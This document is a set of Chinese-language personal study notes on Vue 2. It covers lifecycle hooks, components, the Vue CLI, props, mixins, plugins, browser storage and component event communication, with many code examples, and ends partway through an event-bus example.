1. beforeCreate（创建前）：数据监测(getter和setter)和初始化事件还未开始，此时 data 的响应式追踪、event/watcher 都还没有被设置，也就是说不能访问到data、computed、watch、methods上的方法和数据。注意：不是vm创建前。
2. created（创建后）：实例创建完成，实例上配置的 options 包括 data、computed、watch、methods 等都配置完成，但是此时渲染得节点还未挂载到 DOM，所以不能访问到 $el属性。
3. beforeMount（挂载前）：在挂载开始之前被调用，相关的render函数首次被调用。此阶段Vue开始解析模板，生成虚拟DOM存在内存中，还没有把虚拟DOM转换成真实DOM，插入页面中。所以网页不能显示解析好的内容。
4. mounted（挂载后）：在el被新创建的 vm.$el（就是真实DOM的拷贝）替换，并挂载到实例上去之后调用（将内存中的虚拟DOM转为真实DOM，真实DOM插入页面）。此时页面中呈现的是经过Vue编译的DOM，这时在这个钩子函数中对DOM的操作可以有效，但要尽量避免。一般在这个阶段进行：开启定时器，发送网络请求，订阅消息，绑定自定义事件等等
5. beforeUpdate（更新前）：响应式数据更新时调用，此时虽然响应式数据更新了，但是对应的真实 DOM 还没有被渲染（数据是新的，但页面是旧的，页面和数据没保持同步呢）。
6. updated（更新后） ：在由于数据更改导致的虚拟DOM重新渲染和打补丁之后调用。此时 DOM 已经根据响应式数据的变化更新了。调用时，组件 DOM已经更新，所以可以执行依赖于DOM的操作。然而在大多数情况下，应该避免在此期间更改状态，因为这可能会导致更新无限循环。该钩子在服务器端渲染期间不被调用。
7. beforeDestroy（销毁前）：实例销毁之前调用。这一步，实例仍然完全可用，this 仍能获取到实例。在这个阶段一般进行关闭定时器，取消订阅消息，解绑自定义事件。
8. destroyed（销毁后）：实例销毁后调用，调用后，Vue 实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁。该钩子在服务端渲染期间不被调用。

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699865546229-4fceabbd-15c8-453d-81e3-59f303c0aa78.png)



解释一下在created和beforeMount之间的判断框的内容：![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699864733377-d7d3fd30-3aff-445a-89ad-835974a31285.png)

判断有没有 el 这个配置项

+ 没有就调用 vm.$mount(el)，如果两个都没有就一直卡着，显示的界面就是最原始的容器的界面。
+ 有 el 这个配置项，就进行判断有没有 template 这个配置项，没有 template 就将 el 绑定的容器编译为 vue 模板

未编译el容器------------------------编译后el容器

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699865279381-499e24c1-ca97-4269-bcdf-249ac638b98b.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699865302645-e0644570-d49a-4d4d-879e-da7548bd81f3.png)

template在这中间起了什么作用？![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699865138417-8c93527f-0d2f-4cff-9737-1ffa2761471c.png)

+ 有 template：如果 el 绑定的容器没有任何内容，就一个空壳子，但在 Vue 实例中写了 template，就会编译解析这个 template 里的内容，生成虚拟 DOM，最后将 虚拟 DOM 转为 真实 DOM 插入页面（其实就可以理解为 template 替代了 el 绑定的容器的内容）。
+ 没有 template，就编译解析 el 绑定的容器，生成虚拟 DOM，后面就顺着生命周期执行下去

# 2.组件化
### 2.1 组件
#### 2.11 非单文件组件
##### 基本使用
Vue中使用组件的三大步骤：

+ 定义组件(创建组件)
+ 注册组件
+ 使用组件(写组件标签)



定义组件

使用Vue.extend(options)创建，option为配置项{}，和new Vue (options)时传入的那个options几乎一样，但有区别；

区别如下：

+ el不要写：最终所有的组件都要经过一个vm的管理，由vm中的el决定服务哪个容器。
+ data必须写成函数式：避免组件在被复用时，数据存在引用关系。
+ 里面用template:{}写html结构，html要被<div>包裹住

```vue
<script type="text/javascript">
    Vue.config.productionTip = false
    //创建school组件
    const school = Vue.extend({
        template:`
				<div class="demo">
					<h2>学校名称：{{schoolName}}</h2>
					<h2>学校地址：{{address}}</h2>
					<button @click="showName">点我提示学校名</button>	
    		</div>`
      	, 
		 // el:'#root'
        data(){
            return {
                schoolName:'尚硅谷',
                address:'北京昌平'
            }
        },
        methods: {
            showName(){
                alert(this.schoolName)
            }
        },
    })
    //创建student组件
    const student = Vue.extend({
        template:`
				<div>
					<h2>学生姓名：{{studentName}}</h2>
					<h2>学生年龄：{{age}}</h2>
    		</div>`,
        data(){
            return {
                studentName:'张三',
                age:18
            }
        }
    })
</script>
```

注册组件

+ 局部注册：靠new Vue的时候传入components选项
+ 全局注册：靠Vue.component('组件名',组件)

```vue
<script>
	//创建vm
    new Vue({
        el: '#root',
        data: {
            msg:'你好啊！'
        },
        //第二步：注册组件（局部注册）
        components: {
            xuexiao: school,
            xuesheng: student
            // ES6简写形式
            // school,
            // student
        }
    })
</script>
```

```vue
<script>
	//第二步：全局注册组件
	Vue.component('hello', hello)
</script>
```

使用组件

直接使用与组件名一致的标签即可

```vue
<div id="root">
    <school></school>
    <hr>
    <student></student>
</div>
```

##### 几个注意点
关于组件名：

+ 一个单词组成：
    - 首字母小写：school
    - 首字母大写：School
+ 多个单词组成：
    - kebab-case命名：my-school
    - CamelCase命名：MySchool (需要Vue脚手架支持)
+ 备注：
    - 组件名尽可能回避HTML中已有的元素名称，例如h2、H2都不行
    - 可以在extend中使用name配置项指定组件在开发者工具中呈现的名字。

关于组件标签：

+ 第一种写法：<school></schol>
+ 第二种写法：<school/>
+ 备注：不用使用脚手架时，<school/>会导致后续组件不能渲染。

一个简写方式：const school=Vue.extend(options)可简写为  const school=options，即const school ={...}

##### 组件的嵌套
```vue
<!-- 准备好一个容器-->
<div id="root"></div>
<script type="text/javascript">
    Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。
    //定义student组件
    const student = Vue.extend({
        name:'student',
        template:`
				<div>
					<h2>学生姓名：{{name}}</h2>	
					<h2>学生年龄：{{age}}</h2>	
    </div>
			`,
        data(){
            return {
                name:'尚硅谷',
                age:18
            }
        }
    })

    //定义school组件
    const school = Vue.extend({
        name:'school',
        template:`
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<student></student>
    </div>
			`,
        data(){
            return {
                name:'尚硅谷',
                address:'北京'
            }
        },
        // 注册组件（局部）
        components:{
            student
        }
    })

    //定义hello组件
    const hello = Vue.extend({
        template:`<h1>{{msg}}</h1>`,
        data(){
            return {
                msg:'欢迎来到尚硅谷学习！'
            }
        }
    })
    //定义app组件
    const app = Vue.extend({
        template:`
				<div>	
					<hello></hello>
					<school></school>
    </div>
			`,
        components:{
            school,
            hello
        }
    })

    //创建vm
    new Vue({
        template:'<app></app>',
        el:'#root',
        //注册组件（局部）
        components:{app}
    })
</script>
```

##### VueComponent
+ school组件本质是一个名为VueComponent的构造函数，且不是程序员定义的，是Vue.extend生成的。
+ 我们只需要写好，Vue解析时会帮我们创建school组件的实例对象，即Vue帮我们执行的：new VueComponent(options)。
+ 特别注意：每次调用Vue.extend，返回的都是一个全新的VueComponent(这个VueComponent可不是实例对象)
+ 关于this指向：
        * 组件配置中：data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是VueComponent实例对象。
+ new Vue(options)配置中：data函数、methods中的函数、watch中的函数、computed中的函数，它们的this均是Vue实例对象。
+ VueComponent的实例对象，简称vc（也可称之为：组件实例对象）。Vue的实例对象，简称vm。

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699930801711-641c8c5e-b4f8-489f-82d5-c16cb16ee01e.png)

##### 一个重要的内置关系
VueComponent.prototype.proto === Vue.prototype

让组件实例对象（vc）可以访问到 Vue原型上的属性、方法。

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699930847346-a5bc9e30-abf7-47d4-aa93-406b530f2d6d.png)

#### 2.12 单文件组件
单文件组件就是将一个组件的代码写在 .vue 这种格式的文件中，webpack 会将 .vue 文件解析成 html,css,js这些形式。

以下为一个案例：

+ 创建school.vue和student.vue
+ 实例化到App.vue中，需要import导入school和student
+ 创建main.js用来实例化vue
+ 创建Index.html为vue绑定的容器

以下代码无法执行成功，能看明白结构即可

```vue
<template>
	<div class="demo">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
		<button @click="showName">点我提示学校名</button>	
	</div>
</template>

<script>
	 export default {
		name:'School',
		data(){
			return {
				name:'尚硅谷',
				address:'北京昌平'
			}
		},
		methods: {
			showName(){
				alert(this.name)
			}
		},
	}
</script>

<style>
	.demo{
		background-color: orange;
	}
</style>
```

```vue
<template>
	<div>
		<h2>学生姓名：{{name}}</h2>
		<h2>学生年龄：{{age}}</h2>
	</div>
</template>

<script>
	 export default {
		name:'Student',
		data(){
			return {
				name:'张三',
				age:18
			}
		}
	}
</script>
```

```vue
<template>
	<div>
		<School></School>
		<Student></Student>
	</div>
</template>

<script>
	//引入组件
	import School from './School.vue'
	import Student from './Student.vue'

	export default {
		name:'App',
		components:{
			School,
			Student
		}
	}
</script>
```

```vue
import App from './App.vue'
  
new Vue({
	el:'#root',
	template:`<App></App>`,
	components:{App},
})
```

```vue
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>练习一下单文件组件的语法</title>
	</head>
	<body>
		<!-- 准备一个容器 -->
		<div id="root"></div>
        <script type="text/javascript" src="../js/vue.js"></script>
		<script type="text/javascript" src="./main.js"></script>
	</body>
</html>
```

### 2.2 脚手架
#### 创建脚手架
1.win+R打开cmd，使用cd(desktop)调整路径到指定文件夹，使用vue create指令创建脚手架

2.选择要使用的vue版本

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699964002586-76c5aa49-44a2-4be9-99ca-f78eb312b731.png)

3.创建成功后，用cd进入文件夹，输入npm run serve，得到下图

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699964233435-d9837151-1577-476d-b1d5-9668cbce0c85.png)

4.使用ctrl+c退出(直接按两次ctrl+c)

#### 脚手架内容
index.html文件相关内容含义

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1699967910170-2f80b213-5c19-4c23-8963-fb39836ea347.png)

组件写入components中，除了App.vue



vue.js与vue.runtime.xxx.js的区别：

+ vue.js是完整版的Vue，包含：核心功能+模板解析器。
+ vue.runtime.xxx.js是运行版的Vue，只包含核心功能，没有模板解析器。
+ 因为vue.runtime.xxx.js没有模板解析器，所以不能使用template配置项，需要使用render函数接收到的createElement函数去指定具体内容。

render函数

+ 是个函数，能接收到参数a
+ 这个 createElement 很关键，是个回调函数，createElement 回调函数能创建元素
+ 因为残缺的vue 不能解析 template，所以render就来帮忙解决这个问题

```vue
new Vue({
  render(createElement) {
      console.log(typeof createElement);
      return createElement('h1', 'hello')
  }
}).$mount('#app')
```

因为 render 函数内并没有用到 this，所以可以简写成箭头函数。

```vue
new Vue({
  // render: h => h(App),
  render: (createElement) => {
    return createElement(App)
  }
}).$mount('#app')

进而可以写成======>
new Vue({
  // render: h => h(App),
  render: createElement => createElement(App)
}).$mount('#app')
最后把 createElement 换成 h 就完事了。
```

修改脚手架的默认配置

+ 使用vue inspect > output.js可以查看到Vue脚手架的默认配置。
+ 使用vue.config.js可以对脚手架进行个性化定制，详情见vue.cli官网

### 2.3 零碎知识
#### ref属性
+ 被用来给元素或子组件注册引用信息（id的替代者）
+ 应用在html标签上获取的是真实DOM元素，应用在组件标签上是组件实例对象（vc）
+ 使用方式：
    - 打标识：<h1 ref="xxx">.....</h1>或 <School ref="xxx"></School>
    - 获取：this.$refs.xxx

```vue
<template>
	<div>
		<h1 v-text="msg" ref="title"></h1>
		<button ref="btn" @click="showDOM">点我输出上方的DOM元素</button>
		<School ref="sch"/>
	</div>
</template>

<script>
	//引入School组件
	import School from './components/School'

	export default {
		name:'App',
		components:{School},
		data() {
			return {
				msg:'欢迎学习Vue！'
			}
		},
		methods: {
			showDOM(){
				console.log(this.$refs.title) //真实DOM元素
				console.log(this.$refs.btn) //真实DOM元素
				console.log(this.$refs.sch) //School组件的实例对象（vc）
			}
		},
	}
</script>
```

#### props配置项
功能：让组件接收外部传过来的数据

props是只读的，Vue底层会监测对props的修改，如果进行了修改，就会发出警告，若业务需求确实需要修改，那么请复制props的内容到data中一份，然后去修改data中的数据。

传递数据：<Demo name="xxx"/>

+ 子传父：子props里面写回调函数，父methods定义回调函数
+ 父传子：父props里面写参数

接收数据：

+ 第一种方式（只接收）：props :['name']
+ 第二种方式（限制类型）：props:{name:String}
+ 第三种方式（限制类型、限制必要性、指定默认值）：

```vue
props:{
	name:{
        type:String, //类型
        required:true, //必要性
        default:'老王' //默认值
	}
}
```

实例：App向school传递参数

```vue
<template>
  <div id="app">
    <img alt="Vue logo" src="./assets/logo.png">
    <Student></Student>
    <School name="zbk" :age="this.age"></School>
  </div>
</template>

<script>
import School from './components/School.vue'

export default {
  name: 'App',
  data () {
    return {
      age: 360  
    }
  },
  components: {
    School,
    Student
  }
}
</script>
```

```vue
<template>
  <div class="demo">
    <h2>学校名称：{{ name }}</h2>
    <h2>学校年龄：{{ age }}</h2>
    <h2>学校地址：{{ address }}</h2>
    <button @click="showName">点我提示学校名</button>
  </div>
</template>

<script>
export default {
  name: "School",
  // 最简单的写法：props: ['name', 'age']
  props: {
    name: {
      type: String,
      required: true // 必须要传的
    },
    age: {
      type: Number,
      required: true
    }
  },
  data() {
    return {
      address: "北京昌平",
    };
  },
  methods: {
    showName() {
      alert(this.name);
    },
  },
};
</script>
```

#### mixin(混入)
+ 混入 (mixin) 提供了一种非常灵活的方式，来分发 Vue 组件中的可复用功能。
+ 一个混入对象可以包含任意组件选项。当组件使用混入对象时，所有混入对象的选项将被“混合”进入该组件本身的选项。
+ mixin在使用时需要先定义一个mixin.js文件，在js文件中写入需要混入的代码，在通过Import导入到vue文件中，导入时需要写成mixin:[]数组格式。

```javascript
export const mixin = {
  methods: {
    showName(){
      alert(this.name)
    }
  },
}
```

```vue
<template>
	<div>
		<h2 @click="showName'">学校名称：{{name}}</h2>
		<h2> 学校地址：{{address}}</h2>
	</div>
</template>

<script>
import {hunhe} from '../mixin'

export default {
	name:'School',
	data(){
     return
			name:'尚硅谷'，
			address:'北京'
  },
	mixins:[hunhe]
}
</script>
```

当组件和混入对象含有同名选项时，这些选项将以恰当的方式进行“合并”。比如，vue和js中同时有data的name，此时发生冲突，以组件(vue)数据为主。

```javascript
var mixin = {
  data: function () {
    return {
      message: 'hello',
      foo: 'abc'
    }
  }
}

new Vue({
  mixins: [mixin],
  data: function () {
    return {
      message: 'goodbye',
      bar: 'def'
    }
  },
  created: function () {
    console.log(this.$data)
    // => { message: "goodbye", foo: "abc", bar: "def" }
  }
})
```

同名钩子函数将合并为一个数组，因此都将被调用。另外，混入对象的钩子将在组件自身钩子之前调用。

```javascript
var mixin = {
  created: function () {
    console.log('混入对象的钩子被调用')
  }
}

new Vue({
  mixins: [mixin],
  created: function () {
    console.log('组件钩子被调用')
  }
})

// => "混入对象的钩子被调用"
// => "组件钩子被调用"
```

值为对象的选项，例如 methods、components 和 directives，将被合并为同一个对象。两个对象键名冲突时，取组件对象的键值对。

```javascript
var mixin = {
  methods: {
    foo: function () {
      console.log('foo')
    },
    conflicting: function () {
      console.log('from mixin')
    }
  }
}

var vm = new Vue({
  mixins: [mixin],
  methods: {
    bar: function () {
      console.log('bar')
    },
    conflicting: function () {
      console.log('from self')
    }
  }
})

vm.foo() // => "foo"
vm.bar() // => "bar"
vm.conflicting() // => "from self"
```

#### 插件
插件通常用来为 Vue 添加全局功能。插件的功能范围没有严格的限制。

通过全局方法 Vue.use() 使用插件。它需要在你调用 new Vue() 启动应用之前完成

```javascript
// 调用 `MyPlugin.install(Vue)`
Vue.use(MyPlugin)

new Vue({
  // ...组件选项
})
```

本质：是包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

```javascript
对象.install = function (Vue, options) {
    // 1. 添加全局过滤器
    Vue.filter(....)

    // 2. 添加全局指令
    Vue.directive(....)

    // 3. 配置全局混入(合)
    Vue.mixin(....)

    // 4. 添加实例方法
    Vue.prototype.$myMethod = function () {...}
    Vue.prototype.$myProperty = xxxx
}

```

案例：需要插件Js文件和Main.js文件

```javascript
export default {
    install(Vue, x, y, z) {
        console.log(x, y, z)
        //全局过滤器
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 4)
        })

        //定义全局指令
        Vue.directive('fbind', {
            //指令与元素成功绑定时（一上来）
            bind(element, binding) {
                element.value = binding.value
            },
            //指令所在元素被插入页面时
            inserted(element, binding) {
                element.focus()
            },
            //指令所在的模板被重新解析时
            update(element, binding) {
                element.value = binding.value
            }
        })

        //定义混入
        Vue.mixin({
            data() {
                return {
                    x: 100,
                    y: 200
                }
            },
        })

        //给Vue原型上添加一个方法（vm和vc就都能用了）
        Vue.prototype.hello = () => { alert('你好啊aaaa') }
    }
}
```

```javascript
// 引入插件
import plugin from './plugin'

// 使用插件
Vue.use(plugin)
```

#### ascoped样式
作用：让样式在局部生效，防止冲突。

写法：<style scoped>

```javascript
<style lang="less" scoped>
	.demo{
		background-color: pink;
		.atguigu{
			font-size: 40px;
		}
	}
</style>
```

### TodoList案例
#### 流程
+ 实现静态组件：抽取组件，使用组件实现静态页面效果
+ 展示动态数据
    - 数据的类型、名称
    - 数据保存在哪个组件
+ 交互：从绑定事件监听开始

#### 静态页面
+ 拆分为Header,List,Item,Footer，在components中创建对应的vue文件，并命名name（使用驼峰命名法，比如UserHeader）
+ 导入到App.vue并注册，将Item导入到list中，并注册
+ 将写好的html和css引入到App.vue中，再进行细分，剪切走对应代码后最好写一个注释，并且把对应的标签写好
+ 剪切粘贴css样式时，最好加上scoped

#### 动态数据
+ todo的item应该存在一个数组中，每一个Item最少都要包含三个属性，即id(001-999)，name(名字)，done(状态)
+ 注意Id应该是字符串String，因为Number是有限的
+ 因为list中有很多Item，所以可以使用v-for进行遍历，并绑定key，而且需要用prop传递参数(注意':')
+ 勾选需要用到checked，可以:checked:todo.done来动态获取状态

#### 交互---不全，具体看代码
##### 添加Item
+ 为Input加上@keyup.enter并在methods中添加对应方法
+ 也可以使用event.target.value获取用户输入的值
+ 将用户的输入包装成一个todo对象
+ id可以使用uuid生成一个独一无二的字符串，uuid是一个包。也可以用nanoid，使uuid的迷你版
    - 使用npm i nanoid安装
    - import{}引入nanoid from 'nanoid'
    - nanoid是一个函数，直接调用就能用
    - ![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1700119660957-21e8779c-6cc8-43d1-93e7-d93469f325e3.png)

#### 总结
+ 组件化编码流程：
    - 拆分静态组件：组件要按照功能点拆分，命名不要与html元素冲突。
    - 实现动态组件：考虑好数据的存放位置，数据是一个组件在用，还是一些组件在用：
        * 一个组件在用：放在组件自身即可。
        *  一些组件在用：放在他们共同的父组件上（状态提升）。
+ 实现交互：从绑定事件开始。
+ props适用于：
    - 父组件 ==> 子组件 通信
    - 子组件 ==> 父组件 通信（要求父先给子一个函数）
+ 使用v-model时要切记：v-model绑定的值不能是props传过来的值，因为props是不可以修改的
+ props传过来的若是对象类型的值，修改对象中的属性时Vue不会报错，但不推荐这样做。
+ 数组的使用很关键，比如reduce(es6)

### 浏览器的本地存储
#### cookie网络饼干
##### 概述
Cookie是最早被提出来的本地存储方式，在此之前，服务端是无法判断网络中的两个请求是否是同一用户发起的，为解决这个问题，Cookie就出现了。Cookie 是存储在用户浏览器中的一段不超过 4 KB 的字符串。它由一个名称（Name）、一个值（Value）和其它几个用于控制 Cookie 有效期、安全性、使用范围的可选属性组成。不同域名下的 Cookie 各自独立，每当客户端发起请求时，会自动把当前域名下所有未过期的 Cookie 一同发送到服务器。

##### 特点：
+ Cookie一旦创建成功，名称就无法修改
+ Cookie是无法跨域名的，也就是说a域名和b域名下的cookie是无法共享的，这也是由Cookie的隐私安全性决定的，这样就能够阻止非法获取其他网站的Cookie
+ 每个域名下Cookie的数量不能超过20个，每个Cookie的大小不能超过4kb
+ 有安全问题，如果Cookie被拦截了，那就可获得session的所有信息，即使加密也于事无补，无需知道cookie的意义，只要转发cookie就能达到目的
+ Cookie在请求一个新的页面的时候都会被发送过去

##### cookie在身份认证中的作用
客户端第一次请求服务器的时候，服务器通过响应头的形式，向客户端发送一个身份认证的 Cookie，客户端会自动将Cookie 保存在浏览器中。

随后，当客户端浏览器每次请求服务器的时候，浏览器会自动将身份认证相关的 Cookie，通过请求头的形式发送给服务器，服务器即可验明客户端的身份。

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1700189078203-e214e332-f43e-4841-9fb8-093af96ebf76.png)

##### cookie不具有安全性
由于 Cookie 是存储在浏览器中的，而且浏览器也提供了读写 Cookie 的 API，因此 Cookie 很容易被伪造，不具有安全性。因此不建议服务器将重要的隐私数据，通过 Cookie 的形式发送给浏览器。

#### Session会话控制
##### 概述
Session是另一种记录客户状态的机制，不同的是Cookie保存在客户端浏览器中，而Session保存在服务器上。客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。session是一种特殊的cookie。cookie是保存在客户端的，而session是保存在服务端。

##### 为什么要使用Session
由于cookie 是存在用户端，而且它本身存储的尺寸大小也有限，最关键是用户可以是可见的，并可以随意的修改，很不安全。那如何又要安全，又可以方便的全局读取信息呢？于是，就有了session 

##### 原理
当客户端第一次请求服务器的时候，服务器生成一份session保存在服务端，将该数据(session)的id以cookie的形式传递给客户端；以后的每次请求，浏览器都会自动的携带cookie来访问服务器(session数据id)。

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1700189351770-92056b4d-4548-4928-830f-6852ea587f46.png)

我觉得可以简单理解为一个表，根据cookie传来的值查询表中的内容

##### 工作流程
![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1700189422429-cfc2d2a2-187e-497a-89e3-4df60e30d8a1.png)

#### LocalStorage
LocalStorage是HTML5新引入的特性，由于有的时候我们存储的信息较大，Cookie就不能满足我们的需求，这时候LocalStorage就派上用场了。

优点：

+ 在大小方面，LocalStorage的大小一般为5MB，可以储存更多的信息
+ LocalStorage是持久储存，并不会随着页面的关闭而消失，除非主动清理，不然会永久存在
+ 仅储存在本地，不像Cookie那样每次HTTP请求都会被携带

缺点：

+ 存在浏览器兼容问题，IE8以下版本的浏览器不支持
+ 如果浏览器设置为隐私模式，那我们将无法读取到LocalStorage
+ LocalStorage受到同源策略的限制，即端口、协议、主机地址有任何一个不相同，都不会访问

使用场景

+ 有些网站有换肤的功能，这时候就可以将换肤的信息存储在本地的LocalStorage中，当需要换肤的时候，直接操作LocalStorage即可
+ 在网站中的用户浏览信息也会存储在LocalStorage中，还有网站的一些不常变动的个人信息等也可以存储在本地的LocalStorage中

常用API

```javascript
// 保存数据到 localStorage
localStorage.setItem('key', 'value');

// 从 localStorage 获取数据
let data = localStorage.getItem('key');

// 从 localStorage 删除保存的数据
localStorage.removeItem('key');

// 从 localStorage 删除所有保存的数据
localStorage.clear();

// 获取某个索引的Key
localStorage.key(index)
```

#### SessionStorage
SessionStorage和LocalStorage都是在HTML5才提出来的存储方案，SessionStorage 主要用于临时保存同一窗口(或标签页)的数据，刷新页面时不会删除，关闭窗口或标签页之后将会删除这些数据。

与LocalStorage对比：

+ SessionStorage和LocalStorage都在本地进行数据存储；
+ SessionStorage也有同源策略的限制，但是SessionStorage有一条更加严格的限制，即SessionStorage只有在同一浏览器的同一窗口下才能够共享；
+ LocalStorage和SessionStorage都不能被爬虫爬取；

使用场景：

由于SessionStorage具有时效性，所以可以用来存储一些网站的游客登录的信息，还有临时的浏览记录的信息。当关闭网站之后，这些信息也就随之消除了。

常用API

```javascript
// 保存数据到 sessionStorage
sessionStorage.setItem('key', 'value');

// 从 sessionStorage 获取数据
let data = sessionStorage.getItem('key');

// 从 sessionStorage 删除保存的数据
sessionStorage.removeItem('key');

// 从 sessionStorage 删除所有保存的数据
sessionStorage.clear();

// 获取某个索引的Key
sessionStorage.key(index)
```

#### 实例
LocalStorage

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>localStorage</title>
  </head>
  <body>
    <h2>localStorage</h2>
    <button onclick="saveData()">点我保存一个数据</button>
    <button onclick="readData()">点我读取一个数据</button>
    <button onclick="deleteData()">点我删除一个数据</button>
    <button onclick="deleteAllData()">点我清空一个数据</button>

    <script type="text/javascript" >
      let p = {name:'张三',age:18}

      function saveData(){
        localStorage.setItem('msg','hello!!!')
        localStorage.setItem('msg2',666)
        // 转成 JSON 对象存进去
        localStorage.setItem('person',JSON.stringify(p))
      }
      function readData(){
        console.log(localStorage.getItem('msg'))
        console.log(localStorage.getItem('msg2'))

        const result = localStorage.getItem('person')
        console.log(JSON.parse(result))
        // console.log(localStorage.getItem('msg3'))
      }
      function deleteData(){
        localStorage.removeItem('msg2')
      }
      function deleteAllData(){
        localStorage.clear()
      }
    </script>
  </body>
</html>
```

SessionStorage

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title>sessionStorage</title>
  </head>
  <body>
    <h2>sessionStorage</h2>
    <button onclick="saveData()">点我保存一个数据</button>
    <button onclick="readData()">点我读取一个数据</button>
    <button onclick="deleteData()">点我删除一个数据</button>
    <button onclick="deleteAllData()">点我清空一个数据</button>

    <script type="text/javascript" >
      let p = {name:'张三',age:18}

      function saveData(){
        sessionStorage.setItem('msg','hello!!!')
        sessionStorage.setItem('msg2',666)
        // 转换成JSON 字符串存进去
        sessionStorage.setItem('person',JSON.stringify(p))
      }
      function readData(){
        console.log(sessionStorage.getItem('msg'))
        console.log(sessionStorage.getItem('msg2'))

        const result = sessionStorage.getItem('person')
        console.log(JSON.parse(result))

        // console.log(sessionStorage.getItem('msg3'))
      }
      function deleteData(){
        sessionStorage.removeItem('msg2')
      }
      function deleteAllData(){
        sessionStorage.clear()
      }
    </script>
  </body>
</html>
```

### 2.4 组件自定义事件
组件自定义事件是一种组件间通信的方式，适用于：子组件 ===> 父组件

使用场景：A是父组件，B是子组件，B想给A传数据，那么就要在A中给B绑定自定义事件（事件的回调在A中）。

#### 绑定自定义事件
第一种方式，在父组件中：<Student @自定义组件名="回调函数"/>或<Student v-on:自定义组件名="回调函数"/>

子组件使用 this.$emit('自定义组件名'，数据) 向父组件传数据

```vue
<template>
  <div class="app">
    <Student @atguigu="getStudentName"/> 
  </div>
</template>

<script>
  import Student from './components/Student'

  export default {
    name:'App',
    components:{Student},
    data() {
      return {
        msg:'你好啊！',
        studentName:''
      }
    },
    methods: {
      getStudentName(name,...params){
        console.log('App收到了学生名：',name,params)
        this.studentName = name
      }
    }
  }
</script>

<style scoped>
  .app{
    background-color: gray;
    padding: 5px;
  }
</style>
```

```vue
<template>
  <div class="student">
    <button @click="sendStudentlName">把学生名给App</button>
  </div>
</template>

<script>
  export default {
    name:'Student',
    data() {
      return {
        name:'张三',
      }
    },
    methods: {
      sendStudentlName(){
        //触发Student组件实例身上的atguigu事件
        this.$emit('atguigu',this.name,666,888,900)
      }
    },
  }
</script>

<style lang="less" scoped>
  .student{
    background-color: pink;
    padding: 5px;
    margin-top: 30px;
  }
</style>
```

第二种方式，在父组件中，使用this.$refs.xxx.$on(自定义组件名,回调函数)，第二种方式更灵活，可以加上定时器。

若想让自定义事件只能触发一次，可以使用once修饰符，或$once方法。

子组件使用  this.$emit('自定义组件名'，数据)  向父组件传数据

```vue
<template>
	<div class="app">	
		<Student ref="student"/>
	</div>
</template>

<script>
	import Student from './components/Student'

	export default {
		name:'App',
		components:{Student},
		data() {
			return {
				studentName:''
			}
		},
		methods: {
			getStudentName(name,...params){
				console.log('App收到了学生名：',name,params)
				this.studentName = name
			},
		},
		mounted() {
			this.$refs.student.$on('atguigu',this.getStudentName) //绑定自定义事件
// this.$refs.student.$once('atguigu',this.getStudentName) //绑定自定义事件（一次性）
		},
	}
</script>

<style scoped>
	.app{
		background-color: gray;
		padding: 5px;
	}
</style>
```

```vue
<template>
	<div class="student">
		<button @click="sendStudentlName">把学生名给App</button>
	</div>
</template>

<script>
	export default {
		name:'Student',
		data() {
			return {
				name:'张三',
			}
		},
		methods: {
			sendStudentlName(){
				//触发Student组件实例身上的atguigu事件
				this.$emit('atguigu',this.name,666,888,900)
			}
		},
	}
</script>

<style lang="less" scoped>
	.student{
		background-color: pink;
		padding: 5px;
		margin-top: 30px;
	}
</style>
```

#### 解绑自定义事件
this.$off('自定义组件名')

```vue
this.$off('atguigu') //解绑一个自定义事件
// this.$off(['atguigu','demo']) //解绑多个自定义事件
// this.$off() //解绑所有的自定义事件
```

#### 组件上也可以绑定原生DOM事件
需要使用native修饰符

.native - 主要是给自定义的组件添加原生事件，该修饰符的作用，就是把一个vue组件转化为一个普通的HTML标签，该修饰符对普通HTML标签是没有任何作用的。

```vue
<!-- 通过父组件给子组件绑定一个自定义事件实现：子给父传递数据（第二种写法，使用ref） -->
<Student ref="student" @click.native="show"/>
```

### 2.5 全局事件总线
适用于任意组件间通信

#### 安装全局事件总线
```vue
new Vue({
	......
	beforeCreate() {
		Vue.prototype.$bus = this //安装全局事件总线，$bus就是当前应用的vm
	},
    ......
}) 
```

#### 使用事件总线
A组件想接收数据，则在A组件中给$bus绑定自定义事件，事件的回调留在A组件自身。

xxxx为自定义的事件总线标志，只有标志相同才会传递数据

在使用后，最好在beforeDestroy钩子中，用$off解绑当前组件所用到的事件

```vue
methods(){
  demo(data){......}
}
......
mounted() {
  this.$bus.$on('xxxx',this.demo)
}
```

```vue
this.$bus.$emit('xxxx',数据)
```

#### 范例
```vue
<template>
	<div class="school">
		<h2>学校名称：{{name}}</h2>
		<h2>学校地址：{{address}}</h2>
	</div>
</template>

<script>
	export default {
		name:'School',
		data() {
			return {
				name:'尚硅谷',
				address:'北京',
			}
		},
        methods: {
            demo(data) {
                console.log('我是School组件，收到了数据',data)
            }
        }
		mounted() {
			// console.log('School',this)
			this.$bus.$on('hello',this.demo)
		},
		beforeDestroy() {
			this.$bus.$off('hello')
		},
